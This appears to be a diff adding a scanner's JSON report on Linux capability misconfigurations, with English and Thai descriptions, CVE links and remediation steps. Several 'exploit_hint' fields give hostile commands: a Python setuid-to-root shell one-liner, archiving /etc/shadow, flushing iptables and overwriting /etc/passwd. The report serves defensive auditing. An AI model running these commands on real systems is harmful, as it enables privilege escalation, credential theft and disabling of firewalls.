@@ -1,0 +1,1185 @@
+{
+    "tool": "COSVINTE \u2014 Combined Scan: Linux Capability Scanner \u00b7 Cron CVE Scanner \u00b7 Kernel CVE Scanner \u00b7 PATH Hijack Scanner \u00b7 Writable Path Scanner",
+    "timestamp": "2026-03-04T12:14:09.160770",
+    "system": {
+        "hostname": "DESKTOP-LUQQHSO",
+        "distro": "Ubuntu 24.04.4 LTS",
+        "arch": "x86_64"
+    },
+    "summary": {
+        "total_findings": 11,
+        "critical": 3,
+        "high": 3,
+        "medium": 4,
+        "low": 0,
+        "interpreters": 4,
+        "world_writable": 0,
+        "overall_cvss_base": 29,
+        "overall_cvss_adjusted": 33,
+        "total_cve_db": 28,
+        "checks_triggered": 1,
+        "total_matches": 7,
+        "vulnerable": 0,
+        "unverified": 7,
+        "patched": 0,
+        "path_entries": 29,
+        "writable_path_dirs": 9,
+        "relative_path_dirs": 0,
+        "phantom_path_dirs": 1,
+        "dangerous_env_vars": 0,
+        "suid_binaries": 0,
+        "dangerous_suid": 0,
+        "total_cve_correlations": 2,
+        "total_writable_paths": 0,
+        "overall_cvss": 10.0,
+        "overall_severity": "CRITICAL"
+    },
+    "findings": [
+        {
+            "binary": "/usr/bin/python3.11",
+            "binary_name": "python3.11",
+            "capability": "cap_setuid",
+            "cap_type": "effective",
+            "severity": "CRITICAL",
+            "risk_score": 9.7,
+            "owner": "unknown",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "unknown",
+            "is_interpreter": true,
+            "risk_factors": [
+                "owned by non-root: unknown (+0.2)",
+                "effective capability (immediately usable)",
+                "scripting interpreter \u2014 trivial exploitation"
+            ],
+            "description": "Allows setting arbitrary UID \u2014 attacker can switch to UID 0 (root) at will.",
+            "description_th": "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 UID \u0e40\u0e1b\u0e47\u0e19\u0e04\u0e48\u0e32\u0e43\u0e14\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e23\u0e27\u0e21\u0e16\u0e36\u0e07 UID 0 (root) \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e1b\u0e47\u0e19 root \u0e44\u0e14\u0e49\u0e17\u0e31\u0e19\u0e17\u0e35",
+            "impact_th": "\u0e2b\u0e32\u0e01 binary \u0e19\u0e35\u0e49\u0e40\u0e1b\u0e47\u0e19 scripting interpreter \u0e40\u0e0a\u0e48\u0e19 python \u0e2b\u0e23\u0e37\u0e2d perl \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e23\u0e31\u0e19 os.setuid(0) \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e47\u0e19 root \u0e44\u0e14\u0e49\u0e43\u0e19\u0e17\u0e31\u0e19\u0e17\u0e35",
+            "exploit_hint": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+            "cves": [
+                "CVE-2021-4034",
+                "CVE-2019-14287"
+            ],
+            "remediation": "Remove cap_setuid from all non-essential binaries. Audit with: getcap -r / 2>/dev/null",
+            "prevention_th": [
+                "\u0e25\u0e1a cap_setuid \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 interpreter \u0e17\u0e38\u0e01\u0e15\u0e31\u0e27 (python, perl, ruby, node \u0e2f\u0e25\u0e2f) \u0e17\u0e31\u0e19\u0e17\u0e35",
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a binary \u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e14\u0e49\u0e27\u0e22: getcap -r / 2>/dev/null | grep setuid",
+                "\u0e43\u0e0a\u0e49 sudo \u0e17\u0e35\u0e48\u0e01\u0e33\u0e2b\u0e19\u0e14\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e41\u0e1a\u0e1a least-privilege \u0e41\u0e17\u0e19\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49 capability",
+                "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49 audit log \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e15\u0e23\u0e27\u0e08\u0e08\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 UID \u0e1c\u0e34\u0e14\u0e1b\u0e01\u0e15\u0e34: auditctl -a always,exit -F arch=b64 -S setuid"
+            ]
+        },
+        {
+            "binary": "/usr/local/bin/custom_tool",
+            "binary_name": "custom_tool",
+            "capability": "cap_sys_admin",
+            "cap_type": "effective",
+            "severity": "CRITICAL",
+            "risk_score": 9.7,
+            "owner": "unknown",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "unknown",
+            "is_interpreter": false,
+            "risk_factors": [
+                "owned by non-root: unknown (+0.2)",
+                "effective capability (immediately usable)"
+            ],
+            "description": "Effectively equivalent to root. Allows mount, pivot_root, kernel module load, arbitrary namespace ops.",
+            "description_th": "\u0e40\u0e17\u0e35\u0e22\u0e1a\u0e40\u0e17\u0e48\u0e32 root \u0e42\u0e14\u0e22\u0e2a\u0e21\u0e1a\u0e39\u0e23\u0e13\u0e4c \u0e0a\u0e48\u0e27\u0e22\u0e43\u0e2b\u0e49\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 mount filesystem, \u0e42\u0e2b\u0e25\u0e14 kernel module, \u0e08\u0e31\u0e14\u0e01\u0e32\u0e23 namespace \u0e44\u0e14\u0e49\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e2d\u0e34\u0e2a\u0e23\u0e30",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2b\u0e25\u0e1a\u0e2b\u0e19\u0e35\u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 container, \u0e1d\u0e31\u0e07 rootkit \u0e23\u0e30\u0e14\u0e31\u0e1a kernel, \u0e41\u0e25\u0e30\u0e22\u0e36\u0e14\u0e04\u0e23\u0e2d\u0e07\u0e23\u0e30\u0e1a\u0e1a\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e44\u0e14\u0e49",
+            "exploit_hint": "docker escape, kernel module injection, overlay mount abuse",
+            "cves": [
+                "CVE-2022-0492",
+                "CVE-2022-25636",
+                "CVE-2021-22555"
+            ],
+            "remediation": "Remove cap_sys_admin. Use specific caps instead. Never assign to untrusted binaries.",
+            "prevention_th": [
+                "\u0e25\u0e1a cap_sys_admin \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01\u0e17\u0e38\u0e01 binary \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19",
+                "\u0e43\u0e0a\u0e49 capability \u0e40\u0e09\u0e1e\u0e32\u0e30\u0e40\u0e08\u0e32\u0e30\u0e08\u0e07\u0e41\u0e17\u0e19 \u0e40\u0e0a\u0e48\u0e19 cap_net_admin \u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e07\u0e32\u0e19 network \u0e40\u0e17\u0e48\u0e32\u0e19\u0e31\u0e49\u0e19",
+                "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49 AppArmor \u0e2b\u0e23\u0e37\u0e2d SELinux \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e08\u0e33\u0e01\u0e31\u0e14\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e40\u0e15\u0e34\u0e21",
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e2a\u0e21\u0e48\u0e33\u0e40\u0e2a\u0e21\u0e2d\u0e14\u0e49\u0e27\u0e22: getcap -r / 2>/dev/null"
+            ]
+        },
+        {
+            "binary": "/usr/bin/node",
+            "binary_name": "node",
+            "capability": "cap_setuid",
+            "cap_type": "effective",
+            "severity": "CRITICAL",
+            "risk_score": 9.7,
+            "owner": "unknown",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "unknown",
+            "is_interpreter": true,
+            "risk_factors": [
+                "owned by non-root: unknown (+0.2)",
+                "effective capability (immediately usable)",
+                "scripting interpreter \u2014 trivial exploitation"
+            ],
+            "description": "Allows setting arbitrary UID \u2014 attacker can switch to UID 0 (root) at will.",
+            "description_th": "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 UID \u0e40\u0e1b\u0e47\u0e19\u0e04\u0e48\u0e32\u0e43\u0e14\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e23\u0e27\u0e21\u0e16\u0e36\u0e07 UID 0 (root) \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e1b\u0e47\u0e19 root \u0e44\u0e14\u0e49\u0e17\u0e31\u0e19\u0e17\u0e35",
+            "impact_th": "\u0e2b\u0e32\u0e01 binary \u0e19\u0e35\u0e49\u0e40\u0e1b\u0e47\u0e19 scripting interpreter \u0e40\u0e0a\u0e48\u0e19 python \u0e2b\u0e23\u0e37\u0e2d perl \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e23\u0e31\u0e19 os.setuid(0) \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e47\u0e19 root \u0e44\u0e14\u0e49\u0e43\u0e19\u0e17\u0e31\u0e19\u0e17\u0e35",
+            "exploit_hint": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+            "cves": [
+                "CVE-2021-4034",
+                "CVE-2019-14287"
+            ],
+            "remediation": "Remove cap_setuid from all non-essential binaries. Audit with: getcap -r / 2>/dev/null",
+            "prevention_th": [
+                "\u0e25\u0e1a cap_setuid \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 interpreter \u0e17\u0e38\u0e01\u0e15\u0e31\u0e27 (python, perl, ruby, node \u0e2f\u0e25\u0e2f) \u0e17\u0e31\u0e19\u0e17\u0e35",
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a binary \u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e14\u0e49\u0e27\u0e22: getcap -r / 2>/dev/null | grep setuid",
+                "\u0e43\u0e0a\u0e49 sudo \u0e17\u0e35\u0e48\u0e01\u0e33\u0e2b\u0e19\u0e14\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e41\u0e1a\u0e1a least-privilege \u0e41\u0e17\u0e19\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49 capability",
+                "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49 audit log \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e15\u0e23\u0e27\u0e08\u0e08\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 UID \u0e1c\u0e34\u0e14\u0e1b\u0e01\u0e15\u0e34: auditctl -a always,exit -F arch=b64 -S setuid"
+            ]
+        },
+        {
+            "binary": "/usr/bin/node",
+            "binary_name": "node",
+            "capability": "cap_setgid",
+            "cap_type": "effective",
+            "severity": "HIGH",
+            "risk_score": 8.7,
+            "owner": "unknown",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "unknown",
+            "is_interpreter": true,
+            "risk_factors": [
+                "owned by non-root: unknown (+0.2)",
+                "effective capability (immediately usable)",
+                "scripting interpreter \u2014 trivial exploitation"
+            ],
+            "description": "Allows setting arbitrary GID \u2014 attacker can join privileged groups (shadow, disk, docker).",
+            "description_th": "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 GID \u0e40\u0e1b\u0e47\u0e19\u0e04\u0e48\u0e32\u0e43\u0e14\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e49\u0e32\u0e23\u0e48\u0e27\u0e21 group \u0e17\u0e35\u0e48\u0e21\u0e35\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e2a\u0e39\u0e07 \u0e40\u0e0a\u0e48\u0e19 shadow, disk, \u0e2b\u0e23\u0e37\u0e2d docker",
+            "impact_th": "\u0e01\u0e32\u0e23\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07 group 'shadow' \u0e40\u0e1b\u0e34\u0e14\u0e43\u0e2b\u0e49\u0e2d\u0e48\u0e32\u0e19 /etc/shadow \u0e44\u0e14\u0e49 \u0e2a\u0e48\u0e27\u0e19 group 'disk' \u0e40\u0e1b\u0e34\u0e14\u0e43\u0e2b\u0e49\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07 raw disk \u0e42\u0e14\u0e22\u0e15\u0e23\u0e07",
+            "exploit_hint": "Switch to GID of 'shadow' group to read /etc/shadow hashes",
+            "cves": [
+                "CVE-2021-4034"
+            ],
+            "remediation": "Remove cap_setgid. Ensure binaries only have minimum required capabilities.",
+            "prevention_th": [
+                "\u0e25\u0e1a cap_setgid \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 binary \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 group",
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e2a\u0e21\u0e32\u0e0a\u0e34\u0e01\u0e02\u0e2d\u0e07 group \u0e17\u0e35\u0e48\u0e21\u0e35\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e2a\u0e39\u0e07: getent group shadow disk docker",
+                "\u0e08\u0e33\u0e01\u0e31\u0e14\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c /etc/shadow \u0e43\u0e2b\u0e49\u0e2d\u0e48\u0e32\u0e19\u0e44\u0e14\u0e49\u0e40\u0e09\u0e1e\u0e32\u0e30 root: chmod 000 /etc/shadow",
+                "\u0e43\u0e0a\u0e49 PAM module \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e08\u0e33\u0e01\u0e31\u0e14\u0e01\u0e32\u0e23\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 group"
+            ]
+        },
+        {
+            "binary": "/usr/bin/perl",
+            "binary_name": "perl",
+            "capability": "cap_dac_override",
+            "cap_type": "effective",
+            "severity": "HIGH",
+            "risk_score": 8.0,
+            "owner": "root",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "binary",
+            "is_interpreter": true,
+            "risk_factors": [
+                "effective capability (immediately usable)",
+                "scripting interpreter \u2014 trivial exploitation"
+            ],
+            "description": "Bypasses all file read/write/execute permission checks \u2014 can read /etc/shadow, /root/.",
+            "description_th": "\u0e02\u0e49\u0e32\u0e21\u0e01\u0e32\u0e23\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14 (read/write/execute) \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2d\u0e48\u0e32\u0e19\u0e2b\u0e23\u0e37\u0e2d\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e43\u0e14\u0e01\u0e47\u0e44\u0e14\u0e49\u0e1a\u0e19\u0e23\u0e30\u0e1a\u0e1a \u0e23\u0e27\u0e21\u0e16\u0e36\u0e07 /etc/shadow \u0e41\u0e25\u0e30 /root/",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2d\u0e48\u0e32\u0e19\u0e44\u0e1f\u0e25\u0e4c password hash, \u0e41\u0e01\u0e49\u0e44\u0e02 /etc/passwd \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1e\u0e34\u0e48\u0e21 backdoor account, \u0e2b\u0e23\u0e37\u0e2d\u0e40\u0e02\u0e35\u0e22\u0e19\u0e17\u0e31\u0e1a binary \u0e17\u0e35\u0e48\u0e21\u0e35 SUID",
+            "exploit_hint": "Read /etc/shadow, overwrite /etc/passwd, modify SUID binaries",
+            "cves": [
+                "CVE-2023-4911",
+                "CVE-2016-1247"
+            ],
+            "remediation": "Remove cap_dac_override. Use ACLs for specific file access instead.",
+            "prevention_th": [
+                "\u0e25\u0e1a cap_dac_override \u0e41\u0e25\u0e30\u0e43\u0e0a\u0e49 POSIX ACL \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e09\u0e1e\u0e32\u0e30\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e35\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e41\u0e17\u0e19",
+                "\u0e15\u0e31\u0e49\u0e07\u0e04\u0e48\u0e32 immutable flag \u0e43\u0e2b\u0e49\u0e44\u0e1f\u0e25\u0e4c\u0e2a\u0e33\u0e04\u0e31\u0e0d: chattr +i /etc/passwd /etc/shadow",
+                "\u0e43\u0e0a\u0e49 IMA (Integrity Measurement Architecture) \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e15\u0e23\u0e27\u0e08\u0e08\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e41\u0e01\u0e49\u0e44\u0e02\u0e44\u0e1f\u0e25\u0e4c",
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a integrity \u0e02\u0e2d\u0e07\u0e44\u0e1f\u0e25\u0e4c\u0e23\u0e30\u0e1a\u0e1a\u0e14\u0e49\u0e27\u0e22 AIDE \u0e2b\u0e23\u0e37\u0e2d Tripwire \u0e40\u0e1b\u0e47\u0e19\u0e1b\u0e23\u0e30\u0e08\u0e33"
+            ]
+        },
+        {
+            "binary": "/usr/bin/vim.basic",
+            "binary_name": "vim.basic",
+            "capability": "cap_dac_read_search",
+            "cap_type": "effective",
+            "severity": "HIGH",
+            "risk_score": 7.0,
+            "owner": "root",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "binary",
+            "is_interpreter": false,
+            "risk_factors": [
+                "effective capability (immediately usable)"
+            ],
+            "description": "Bypasses file read and directory search permission checks \u2014 allows reading any file.",
+            "description_th": "\u0e02\u0e49\u0e32\u0e21\u0e01\u0e32\u0e23\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e01\u0e32\u0e23\u0e2d\u0e48\u0e32\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e41\u0e25\u0e30\u0e01\u0e32\u0e23\u0e04\u0e49\u0e19\u0e2b\u0e32\u0e43\u0e19 directory \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2d\u0e48\u0e32\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e43\u0e14\u0e01\u0e47\u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e19\u0e33\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e25\u0e31\u0e1a\u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01\u0e23\u0e30\u0e1a\u0e1a \u0e40\u0e0a\u0e48\u0e19 private key, config files, database credentials \u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e17\u0e34\u0e49\u0e07\u0e23\u0e48\u0e2d\u0e07\u0e23\u0e2d\u0e22\u0e43\u0e19\u0e23\u0e30\u0e1a\u0e1a permission \u0e1b\u0e01\u0e15\u0e34",
+            "exploit_hint": "tar -czf /tmp/shadow.tar.gz /etc/shadow",
+            "cves": [
+                "CVE-2014-8990"
+            ],
+            "remediation": "Remove cap_dac_read_search. Restrict to specific backup tools only.",
+            "prevention_th": [
+                "\u0e08\u0e33\u0e01\u0e31\u0e14 cap_dac_read_search \u0e40\u0e09\u0e1e\u0e32\u0e30 backup tool \u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e41\u0e25\u0e49\u0e27\u0e40\u0e17\u0e48\u0e32\u0e19\u0e31\u0e49\u0e19",
+                "\u0e40\u0e02\u0e49\u0e32\u0e23\u0e2b\u0e31\u0e2a\u0e44\u0e1f\u0e25\u0e4c sensitive \u0e14\u0e49\u0e27\u0e22 encryption at rest \u0e41\u0e21\u0e49\u0e08\u0e30\u0e16\u0e39\u0e01\u0e2d\u0e48\u0e32\u0e19\u0e44\u0e14\u0e49\u0e01\u0e47\u0e44\u0e21\u0e48\u0e21\u0e35\u0e1b\u0e23\u0e30\u0e42\u0e22\u0e0a\u0e19\u0e4c",
+                "\u0e43\u0e0a\u0e49 audit log \u0e15\u0e23\u0e27\u0e08\u0e08\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07\u0e44\u0e1f\u0e25\u0e4c sensitive: auditctl -w /etc/shadow -p r",
+                "\u0e41\u0e22\u0e01 sensitive files \u0e44\u0e1b\u0e44\u0e27\u0e49\u0e43\u0e19 filesystem \u0e17\u0e35\u0e48\u0e21\u0e35 access control \u0e40\u0e02\u0e49\u0e21\u0e07\u0e27\u0e14"
+            ]
+        },
+        {
+            "binary": "/usr/sbin/dumpcap",
+            "binary_name": "dumpcap",
+            "capability": "cap_net_admin",
+            "cap_type": "effective",
+            "severity": "MEDIUM",
+            "risk_score": 6.7,
+            "owner": "unknown",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "unknown",
+            "is_interpreter": false,
+            "risk_factors": [
+                "owned by non-root: unknown (+0.2)",
+                "effective capability (immediately usable)"
+            ],
+            "description": "Full network configuration access \u2014 can modify routing, firewall rules, sniff traffic.",
+            "description_th": "\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07\u0e01\u0e32\u0e23\u0e15\u0e31\u0e49\u0e07\u0e04\u0e48\u0e32 network \u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14 \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e41\u0e01\u0e49\u0e44\u0e02 routing table, \u0e01\u0e0e firewall, \u0e41\u0e25\u0e30\u0e14\u0e31\u0e01\u0e1f\u0e31\u0e07 traffic \u0e43\u0e19\u0e23\u0e30\u0e1a\u0e1a",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e25\u0e49\u0e32\u0e07 firewall rules \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e34\u0e14 port, \u0e17\u0e33 ARP spoofing \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e14\u0e31\u0e01\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25, \u0e2b\u0e23\u0e37\u0e2d redirect traffic \u0e44\u0e1b\u0e22\u0e31\u0e07 attacker-controlled server",
+            "exploit_hint": "iptables -F (flush all firewall rules), ARP spoofing, traffic capture",
+            "cves": [
+                "CVE-2020-14386",
+                "CVE-2016-8655"
+            ],
+            "remediation": "Limit to network management daemons only. Never assign to scripting languages.",
+            "prevention_th": [
+                "\u0e08\u0e33\u0e01\u0e31\u0e14 cap_net_admin \u0e40\u0e09\u0e1e\u0e32\u0e30 daemon \u0e17\u0e35\u0e48\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23 network \u0e40\u0e17\u0e48\u0e32\u0e19\u0e31\u0e49\u0e19 (\u0e40\u0e0a\u0e48\u0e19 NetworkManager)",
+                "\u0e2b\u0e49\u0e32\u0e21\u0e01\u0e33\u0e2b\u0e19\u0e14 cap_net_admin \u0e43\u0e2b\u0e49\u0e01\u0e31\u0e1a scripting interpreter \u0e2b\u0e23\u0e37\u0e2d general-purpose tools",
+                "\u0e43\u0e0a\u0e49 network namespace \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e41\u0e22\u0e01 network environment \u0e02\u0e2d\u0e07\u0e41\u0e15\u0e48\u0e25\u0e30 process",
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a firewall rules \u0e40\u0e1b\u0e47\u0e19\u0e1b\u0e23\u0e30\u0e08\u0e33: iptables -L -n -v"
+            ]
+        },
+        {
+            "binary": "/usr/bin/tcpdump",
+            "binary_name": "tcpdump",
+            "capability": "cap_net_raw",
+            "cap_type": "effective",
+            "severity": "MEDIUM",
+            "risk_score": 6.2,
+            "owner": "unknown",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "unknown",
+            "is_interpreter": false,
+            "risk_factors": [
+                "owned by non-root: unknown (+0.2)",
+                "effective capability (immediately usable)"
+            ],
+            "description": "Allows raw socket creation \u2014 enables network sniffing, spoofing, and ICMP manipulation.",
+            "description_th": "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\u0e2a\u0e23\u0e49\u0e32\u0e07 raw socket \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e31\u0e01\u0e1f\u0e31\u0e07 network traffic, \u0e1b\u0e25\u0e2d\u0e21\u0e41\u0e1b\u0e25\u0e07 packet, \u0e41\u0e25\u0e30\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23 ICMP \u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e31\u0e01\u0e08\u0e31\u0e1a credentials \u0e17\u0e35\u0e48\u0e2a\u0e48\u0e07\u0e1c\u0e48\u0e32\u0e19 network, \u0e17\u0e33 ARP poisoning \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e17\u0e33 MITM attack, \u0e2b\u0e23\u0e37\u0e2d inject packet \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19\u0e2d\u0e31\u0e19\u0e15\u0e23\u0e32\u0e22",
+            "exploit_hint": "tcpdump credential capture, ARP/ICMP spoofing, packet injection",
+            "cves": [
+                "CVE-2020-14386"
+            ],
+            "remediation": "Limit cap_net_raw to specific tools (ping, tcpdump). Never assign broadly.",
+            "prevention_th": [
+                "\u0e08\u0e33\u0e01\u0e31\u0e14 cap_net_raw \u0e40\u0e09\u0e1e\u0e32\u0e30 tool \u0e17\u0e35\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e08\u0e23\u0e34\u0e07\u0e46 \u0e40\u0e0a\u0e48\u0e19 ping \u0e2b\u0e23\u0e37\u0e2d tcpdump \u0e17\u0e35\u0e48\u0e23\u0e30\u0e1a\u0e38 path \u0e0a\u0e31\u0e14\u0e40\u0e08\u0e19",
+                "\u0e43\u0e0a\u0e49 network encryption (TLS/HTTPS) \u0e17\u0e38\u0e01\u0e17\u0e35\u0e48\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e25\u0e14\u0e1c\u0e25\u0e01\u0e23\u0e30\u0e17\u0e1a\u0e08\u0e32\u0e01 sniffing",
+                "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49 Dynamic ARP Inspection \u0e1a\u0e19 switch \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e1b\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e19 ARP spoofing",
+                "Monitor network anomaly \u0e14\u0e49\u0e27\u0e22 IDS \u0e40\u0e0a\u0e48\u0e19 Suricata \u0e2b\u0e23\u0e37\u0e2d Snort"
+            ]
+        },
+        {
+            "binary": "/usr/sbin/dumpcap",
+            "binary_name": "dumpcap",
+            "capability": "cap_net_raw",
+            "cap_type": "effective",
+            "severity": "MEDIUM",
+            "risk_score": 6.2,
+            "owner": "unknown",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "unknown",
+            "is_interpreter": false,
+            "risk_factors": [
+                "owned by non-root: unknown (+0.2)",
+                "effective capability (immediately usable)"
+            ],
+            "description": "Allows raw socket creation \u2014 enables network sniffing, spoofing, and ICMP manipulation.",
